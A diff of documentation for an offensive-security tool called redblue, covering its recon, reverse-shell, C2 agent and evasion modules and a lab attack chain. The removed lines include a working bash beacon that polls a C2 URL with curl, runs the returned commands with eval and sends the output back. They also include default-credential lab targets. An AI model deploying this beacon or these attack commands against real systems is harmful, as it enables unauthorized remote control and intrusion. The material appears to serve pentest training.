@@ -35,13 +35,13 @@ redblue organizes offensive capabilities into specialized modules:
 │  Discovery       Payloads        Reverse        Persistent                  │
 │  & intel         & exploits      shells         control                     │
 │                                                                              │
-│  ┌──────────┐    ┌──────────┐                                              │
-│  │   CTF    │    │ EVASION  │                                              │
-│  └──────────┘    └──────────┘                                              │
-│       │               │                                                     │
-│       ▼               ▼                                                     │
-│  Lab/training    Anti-AV/EDR                                               │
-│  automation      techniques                                                 │
+│                  ┌──────────┐                                               │
+│                  │ EVASION  │                                               │
+│                  └──────────┘                                               │
+│                       │                                                     │
+│                       ▼                                                     │
+│                  Anti-AV/EDR                                                │
+│                  techniques                                                 │
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
@@ -54,7 +54,6 @@ redblue organizes offensive capabilities into specialized modules:
 | **access** | Initial access (shells, listeners) | `rb access shell create`, `rb access shell listen` |
 | **agent** | C2 - Post-exploitation control | `rb agent c2 server`, `rb agent c2 connect` |
 | **attack** | Orchestrates complete workflows | `rb attack workflow plan`, `rb attack workflow run` |
-| **ctf** | Lab/CTF automation | `rb ctf target pwn`, `rb ctf target ssh` |
 | **evasion** | Defense bypass techniques | `rb evasion sandbox detect`, `rb evasion memory encrypt` |
 
 ### access vs attack
@@ -66,32 +65,22 @@ redblue organizes offensive capabilities into specialized modules:
 | **Use case** | "I need a reverse shell" | "Plan and execute full pentest" |
 | **Commands** | `rb access shell create/listen` | `rb attack workflow plan/run/suggest` |
 
-### agent vs ctf
-
-| Aspect | `agent` | `ctf` |
-|--------|---------|-------|
-| **Purpose** | Generic C2 framework | Lab/CTF automation |
-| **Use case** | Real pentest operations | Training & education |
-| **Complexity** | Manual, flexible | Automatic, one-click |
-| **Flow** | Server + client separate | Pwn + deploy + control combined |
-
 ### Typical Attack Flow
 
 ```bash
 # 1. RECON - Discover target
 rb recon domain subdomains target.com
 
-# 2. EXPLOIT - Generate payload
-rb exploit payload shell bash 10.0.0.1 4444
+# 2. ATTACK - Plan and execute
+rb attack workflow plan http://target.com
+rb attack workflow run http://target.com
 
-# 3. ACCESS - Start listener
+# 3. ACCESS - Get shell if needed
 rb access shell listen --port 4444
 
 # 4. AGENT - Post-exploitation control
 rb agent c2 server --port 4444
-
-# 5. CTF - Automated lab exploitation
-rb ctf target pwn 127.0.0.1 --port 20022 --type ssh --c2 localhost:4444
+rb agent c2 connect http://c2-server:4444
 ```
 
 ---
@@ -187,114 +176,52 @@ The nginx-vuln service includes several flags to find:
 
 ## C2 Agent Integration
 
-For advanced red team exercises, you can combine CTF exploitation with C2 agent deployment for persistent control.
+For advanced red team exercises, combine attack workflow with C2 agent deployment.
 
-### Prerequisites
-
-```bash
-# Install sshpass for automated SSH exploitation
-sudo apt install sshpass  # Debian/Ubuntu
-brew install hudochenkov/sshpass/sshpass  # macOS
-```
-
-### CTF Containers (docker-compose.ctf.yml)
-
-Additional CTF containers with weak credentials for C2 practice:
-
-| Service | Port | Credentials | Network IP |
-|---------|------|-------------|------------|
-| ctf-ssh | 20022 | root/root | 172.25.0.13 |
-| ctf-dvwa | 20080 | admin/password | 172.25.0.10 |
-| ctf-mysql | 23306 | root/toor | 172.25.0.11 |
-| ctf-redis | 26379 | (no auth) | 172.25.0.12 |
-
-### Complete Attack Chain: CTF → C2 Agent
+### Complete Attack Chain
 
 ```bash
-# Step 1: Start CTF containers
-docker compose -f docker-compose.ctf.yml up -d
+# Step 1: Start vulnerable containers
+docker compose up -d
 
 # Step 2: Start C2 server (Terminal 1)
 rb agent c2 server --port 4444
 
-# Step 3: Exploit target and deploy agent (Terminal 2)
-rb ctf target pwn 127.0.0.1 --port 20022 --type ssh --c2 localhost:4444
+# Step 3: Run attack workflow (Terminal 2)
+rb attack workflow plan http://localhost:8080
+rb attack workflow run http://localhost:8080
 
-# Step 4: List captured flags
-rb ctf target flags
+# Step 4: Deploy agent via access module
+rb access shell create --type bash --host <your-ip> --port 4444
 
 # Step 5: Monitor agents on C2 server
 # (agents will beacon back to your server)
-```
-
-### Manual SSH Exploitation
-
-```bash
-# List available CTF targets
-rb ctf target list
-
-# Exploit SSH with weak credentials
-rb ctf target ssh 127.0.0.1 --port 20022 --user root --pass root
-
-# Capture flags only (no agent deployment)
-rb ctf target flags 127.0.0.1 --port 20022
-```
-
-### Agent Beacon Script
-
-When using `rb ctf target pwn`, the following beacon script is deployed:
-
-```bash
-#!/bin/bash
-# Deployed to /tmp/.beacon on compromised host
-C2_SERVER="http://your-c2:4444"
-
-while true; do
-    # Check in with C2
-    RESPONSE=$(curl -s "$C2_SERVER/beacon" \
-        -d '{"hostname":"'$(hostname)'","os":"'$(uname -s)'","type":"checkin"}')
-
-    # Execute any pending commands
-    CMD=$(echo "$RESPONSE" | grep -o '"cmd":"[^"]*"' | cut -d'"' -f4)
-    if [ -n "$CMD" ]; then
-        RESULT=$(eval "$CMD" 2>&1)
-        curl -s "$C2_SERVER/beacon" \
-            -d '{"type":"result","output":"'"$RESULT"'"}'
-    fi
-
-    # Sleep with jitter (50-70 seconds)
-    sleep $((50 + RANDOM % 20))
-done
 ```
 
 ### Attack Flow Diagram
 
 ```
 ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│  Attacker   │     │  C2 Server  │     │  CTF Target │
-│  Machine    │     │  (rb agent) │     │  (ctf-ssh)  │
+│  Attacker   │     │  C2 Server  │     │   Target    │
+│  Machine    │     │  (rb agent) │     │  (DVWA)     │
 └──────┬──────┘     └──────┬──────┘     └──────┬──────┘
        │                   │                   │
        │ 1. Start server   │                   │
        │──────────────────▶│                   │
        │                   │                   │
-       │ 2. rb ctf pwn     │                   │
+       │ 2. attack plan    │                   │
        │───────────────────────────────────────▶
        │                   │                   │
-       │                   │   3. SSH login    │
-       │                   │   (root/root)     │
-       │                   │◀──────────────────│
-       │                   │                   │
-       │ 4. Capture flags  │                   │
-       │◀──────────────────────────────────────│
-       │                   │                   │
-       │ 5. Deploy beacon  │                   │
+       │ 3. attack run     │                   │
        │───────────────────────────────────────▶
        │                   │                   │
-       │                   │   6. Beacon       │
+       │ 4. Deploy agent   │                   │
+       │───────────────────────────────────────▶
+       │                   │                   │
+       │                   │   5. Beacon       │
        │                   │◀──────────────────│
        │                   │                   │
-       │                   │   7. Commands     │
+       │                   │   6. Commands     │
        │                   │──────────────────▶│
        │                   │                   │
 ```
@@ -303,9 +230,9 @@ done
 
 | Technique | ID | Phase |
 |-----------|-----|-------|
-| Valid Accounts: Default Credentials | T1078.001 | Initial Access |
-| Command and Scripting Interpreter: Bash | T1059.004 | Execution |
-| Scheduled Task/Job: Cron | T1053.003 | Persistence |
+| Active Scanning | T1595 | Reconnaissance |
+| Exploit Public-Facing Application | T1190 | Initial Access |
+| Command and Scripting Interpreter | T1059 | Execution |
 | Application Layer Protocol: HTTP | T1071.001 | C2 |
 
 ## Cleanup
